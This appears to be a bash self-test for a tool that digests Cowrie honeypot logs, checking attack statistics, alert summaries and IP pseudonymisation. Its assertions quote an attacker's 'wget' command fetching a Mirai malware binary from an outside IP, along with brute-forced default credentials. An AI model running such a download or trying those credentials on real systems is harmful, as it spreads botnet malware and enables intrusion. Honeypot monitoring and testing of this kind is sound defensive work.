#!/usr/bin/env bash
# cowrie-digest self-test — runs the digest against a fixture log and
# verifies the aggregation. No network, no Cowrie required.
set -euo pipefail

SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FIXTURE="${SRC_DIR}/tests/fixtures/sample_cowrie.jsonl"
TMP_CFG="$(mktemp)"
trap 'rm -f "${TMP_CFG}"' EXIT

cat > "${TMP_CFG}" <<EOF
COWRIE_LOG=${FIXTURE}
DIGEST_HOURS=876000
STATE_DIR=$(mktemp -d)
SENSOR_NAME=test-sensor
EOF

echo "==> running digest against fixture..."
OUT="$("${SRC_DIR}/digest.py" --print --config "${TMP_CFG}")"
echo "${OUT}"
echo ""

fail=0
check() {
    if grep -qF "$1" <<<"${OUT}"; then
        echo "PASS: report contains '$1'"
    else
        echo "FAIL: report missing '$1'" >&2
        fail=1
    fi
}

check "Connections:      4"
check "Unique IPs:       3"
check "Failed logins:    5"
check "Successful logins: 2"
check "Commands run:     3"
check "Files downloaded: 1"
check "198.51.100.23"
check "root/123456"
check "wget http://185.220.101.4/bins/mirai.x86"
check "http://185.220.101.4/bins/mirai.x86"
check "IPs that got a shell"

echo ""
echo "==> testing alert aggregation..."
python3 - "${SRC_DIR}" <<'PYEOF'
import sys
sys.path.insert(0, sys.argv[1])
from digest import build_alert_summary

successes = [("198.51.100.23", "root", "123456")] * 7 + [
    ("203.0.113.7", "admin", "admin")] * 2
downloads = [("198.51.100.23", "http://185.220.101.4/bins/mirai.x86", "ab12cd")]
out = build_alert_summary(successes, downloads, "test-sensor")
print(out)
assert "Successful logins: 9" in out, "count wrong"
assert "7x  198.51.100.23 → root/123456" in out, "top cred wrong"
assert "Malware downloads: 1" in out
assert "mirai.x86" in out
assert "sha256: ab12cd" in out
print("PASS: alert aggregation works")
PYEOF

echo ""
echo "==> testing pseudonymization (#8)..."
KEY_DIR="$(mktemp -d)"
python3 - "${SRC_DIR}" "${KEY_DIR}" <<'PYEOF'
import re
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, sys.argv[1])
from lib.pseudo import Pseudonymizer, ensure_key

src, keydir = sys.argv[1], Path(sys.argv[2])
fixture = Path(src) / "tests/fixtures/sample_cowrie.jsonl"

# --- unit: Pseudonymizer semantics ---
key = ensure_key(keydir / "pseudo.key")
assert (keydir / "pseudo.key").stat().st_mode & 0o777 == 0o600, "key perms"
p = Pseudonymizer(key)
a1, a2 = p.pseudo_ip("198.51.100.23"), p.pseudo_ip("198.51.100.23")
assert a1 == a2, "not deterministic"
assert re.fullmatch(r"ip-[0-9a-f]{12}", a1), f"bad format: {a1}"
assert p.pseudo_ip("203.0.113.7") != a1, "collision between different IPs"
masked = p.mask("hit from 198.51.100.23 via http://185.220.101.4/bins/x v999.1.1.1")
assert "198.51.100.23" not in masked and "185.220.101.4" not in masked
assert "999.1.1.1" in masked, "invalid IPv4 should pass through"
assert "ip-" in masked and "/bins/x" in masked
print("PASS: pseudonymizer unit semantics (deterministic, format, URLs, invalid-IP passthrough)")

# --- e2e: --print output must contain ZERO raw IPv4 when key is present ---
cfg = keydir / "config.env"
statedir = keydir / "state"
statedir.mkdir()
cfg.write_text(
    f"COWRIE_LOG={fixture}\nDIGEST_HOURS=876000\nSTATE_DIR={statedir}\n"
    f"SENSOR_NAME=test-sensor\nPSEUDO_ENABLED=true\n"
    f"PSEUDO_KEY_PATH={keydir / 'pseudo.key'}\n"
)
out1 = subprocess.run([sys.executable, str(Path(src) / "digest.py"), "--print",
                       "--config", str(cfg)], capture_output=True, text=True)
assert out1.returncode == 0, out1.stderr
raw_ips = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", out1.stdout)
assert not raw_ips, f"raw IPv4 leaked into output: {raw_ips}"
assert "ip-" in out1.stdout, "no pseudonyms in output"
assert "Connections:      4" in out1.stdout, "aggregation broke under masking"
assert "IPs that got a shell" in out1.stdout

# determinism across runs
out2 = subprocess.run([sys.executable, str(Path(src) / "digest.py"), "--print",
                       "--config", str(cfg)], capture_output=True, text=True)
assert out2.returncode == 0
assert out1.stdout == out2.stdout, "pseudonyms not stable across runs"

# --print-raw still available for local debugging
out3 = subprocess.run([sys.executable, str(Path(src) / "digest.py"), "--print-raw",
                       "--config", str(cfg)], capture_output=True, text=True)
assert out3.returncode == 0 and "198.51.100.23" in out3.stdout, "--print-raw broken"

# different key -> different pseudonym
key2 = ensure_key(keydir / "other.key")
p2 = Pseudonymizer(key2)
assert p2.pseudo_ip("198.51.100.23") != a1, "pseudonym must depend on key"
print("PASS: e2e — zero raw IPs in output, stable pseudonyms, --print-raw escape hatch")
PYEOF

echo ""
if [[ ${fail} -eq 0 ]]; then
    echo "==> ALL TESTS PASSED"
else
    echo "==> TESTS FAILED" >&2
    exit 1
fi
